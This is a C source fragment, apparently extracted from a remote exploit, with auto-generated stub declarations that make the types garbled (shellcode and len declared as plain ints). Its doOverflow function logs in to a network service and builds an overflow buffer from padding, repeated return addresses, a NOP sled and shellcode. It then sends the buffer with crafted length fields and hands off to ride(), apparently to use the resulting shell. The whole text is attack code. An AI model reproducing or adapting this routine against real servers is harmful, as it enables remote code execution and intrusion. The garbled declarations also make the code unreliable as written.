
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int rd ;
typedef int len ;


 int MAXPATHLEN ;
 int abs (int) ;
 int close (int) ;
 int connect_and_version () ;
 int get (int) ;
 int login (int) ;
 int memcpy (char*,int ,int ) ;
 int memset (char*,char,int) ;
 int nopcount ;
 int printf (char*,int,int,int,int) ;
 int ride () ;
 int send (int,...) ;
 int shellcode ;
 int strlen (int ) ;

void doOverflow(int len, int line,int align) {
int s,rd;
int *ptr;
char buff[MAXPATHLEN];

s = connect_and_version();
login(s);

printf("Trying with len=%d and line=0x%x (shellcode=0x%x) align=%d\n",len,line,line+abs(len),align);

memset(buff,'A',align);


for(ptr = (int*) (&buff[0]+align); (char*)ptr < ((char*)&buff[MAXPATHLEN]-3); ptr++)
*ptr = (line+abs(len));
memset(buff+abs(len),'\x90',nopcount);
memcpy(buff+abs(len)+nopcount,shellcode,strlen(shellcode));


rd = MAXPATHLEN -1;
send(s,&rd,sizeof(rd),0);


send(s,buff,rd,0);



send(s,&len,sizeof(len),0);



rd = 0;
send(s,&rd,sizeof(rd),0);



get(s);

close(s);


ride();
}
